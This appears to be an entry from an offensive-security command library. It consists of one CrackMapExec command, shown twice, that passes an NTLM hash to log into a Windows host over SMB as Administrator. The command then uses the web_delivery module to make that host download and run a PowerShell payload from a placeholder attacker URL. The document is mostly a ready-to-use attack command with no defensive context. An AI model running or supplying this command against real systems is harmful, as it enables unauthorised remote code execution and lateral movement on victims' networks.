---
id: 9c6f4c1f-6893-4e0b-9621-3fdfa8521eb1
name: Execute smb module with web_delivery module and URL option
type: command
executor: bash
data: root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f"
  -M web_delivery -o URL="https://IP:PORT/posh-payload"
output: null
created_at: '2023-04-06T03:56:01.851628+00:00'
updated_at: '2023-04-10T20:25:48.419627+00:00'
---

# Execute smb module with web_delivery module and URL option

```bash
root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" -M web_delivery -o URL="https://IP:PORT/posh-payload"
```


